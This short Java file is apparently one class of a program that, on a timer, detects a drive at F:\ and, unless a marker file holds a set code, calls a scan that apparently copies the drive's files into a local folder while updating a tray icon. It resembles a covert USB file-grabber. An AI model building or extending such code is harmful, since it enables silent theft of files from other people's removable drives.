package cpp;

import java.awt.Image;
import java.awt.Toolkit;
import java.awt.TrayIcon;
import java.io.File;
import java.util.TimerTask;

public class check extends TimerTask{
	public void run() {
		File f=new File("F:\\");
		if(main.boo&&f.exists()&&!new file0().read("F:\\protect.p").equals("187003")){
			File fol=new File("ser");
			fol.mkdir();
			File fol2=new File("bats");
			fol2.mkdir();
			main.boo=false;
			Image img=Toolkit.getDefaultToolkit().createImage("Í¼±ê2.jpg");
			main.ti3.setImage(img);
			new fs().FileScan("F:\\","ser\\");
		}
	}
	
}
